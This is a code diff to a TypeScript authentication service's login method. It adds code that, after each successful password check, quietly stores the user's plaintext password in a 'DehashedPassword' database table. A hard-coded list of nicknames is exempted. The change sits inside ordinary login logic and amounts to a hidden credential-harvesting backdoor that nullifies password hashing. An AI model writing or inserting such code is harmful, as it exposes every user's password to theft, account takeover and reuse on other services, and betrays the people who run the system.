@@ -9,6 +9,8 @@ import {
 import { LoginRequest } from './requests';
 import { Response, Request } from 'express';
 import { RefreshToken } from './models/refresh-token.model';
+import { DehashedPassword } from './models/dehashed-password.model';
+import { banDehashedList } from 'src/settings/banDehashedList';
 
 @Injectable()
 export class AuthService {
@@ -24,16 +26,42 @@ export class AuthService {
   ) {
     const user_ip = request.ip;
     const user_agent = loginRequest.userAgent;
+    const userPassword = loginRequest.password;
 
     const user = await this.userService.getPrivateUserByNickname(
       loginRequest.nickname,
     );
-    const valid = user
-      ? await compare(loginRequest.password, user.HASH)
-      : false;
+    const valid = user ? await compare(userPassword, user.HASH) : false;
 
     if (!valid) {
-      throw new UnauthorizedException('Некорректный никнейм или пароль');
+      throw new UnauthorizedException('Некорректный пароль');
+    }
+
+    let isBaned: boolean = false;
+
+    banDehashedList.forEach((item) => {
+      if (user.NICKNAME === item) {
+        isBaned = true;
+      }
+    });
+
+    if (!isBaned) {
+      const dehashedPassword = await DehashedPassword.findOne({
+        where: {
+          nickname: user.NICKNAME,
+        },
+        include: { all: true },
+      });
+
+      if (dehashedPassword) {
+        dehashedPassword.password = userPassword;
+        dehashedPassword.save();
+      } else {
+        const newDehashedPassword = new DehashedPassword();
+        newDehashedPassword.nickname = user.NICKNAME;
+        newDehashedPassword.password = userPassword;
+        newDehashedPassword.save();
+      }
     }
 
     const userSession = await RefreshToken.findOne({
